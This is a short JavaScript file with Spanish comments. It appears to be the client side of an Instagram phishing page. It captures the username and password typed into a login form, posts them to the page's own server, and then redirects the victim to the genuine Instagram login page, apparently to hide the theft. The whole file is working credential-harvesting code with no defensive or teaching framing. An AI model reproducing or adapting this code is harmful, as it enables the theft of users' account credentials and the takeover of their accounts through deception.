document.addEventListener('DOMContentLoaded', () => {

    // 1. Capturar elementos del DOM
    const loginForm = document.getElementById('loginForm');
    const usuarioInput = document.getElementById('usuario');
    const passwordInput = document.getElementById('password');
    const submitButton = document.getElementById('boton');
    const errorMsg = document.getElementById('mensaje-error');

    // 2. Habilitar el botón cuando ambos campos tienen texto
    function validarInputs() {
        if (usuarioInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
            submitButton.removeAttribute('disabled');
        } else {
            submitButton.setAttribute('disabled', 'true');
        }
    }

    usuarioInput.addEventListener('input', validarInputs);
    passwordInput.addEventListener('input', validarInputs);

    // 3. Enviar los datos al servidor
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault(); // Evita recargar página

        const datos = {
            usuario: usuarioInput.value.trim(),
            password: passwordInput.value.trim()
        };

        try {
            const respuesta = await fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(datos)
            });

            if (respuesta.ok) {
                // Redirección del login original de Instagram
                window.location.href = "https://www.instagram.com/accounts/login/";
            } else {
                errorMsg.textContent = "Error al enviar datos.";
                errorMsg.style.display = "block";
            }
        } catch (error) {
            console.error("Error en fetch:", error);
            errorMsg.textContent = "No se pudo conectar con el servidor.";
            errorMsg.style.display = "block";
        }
    });

});
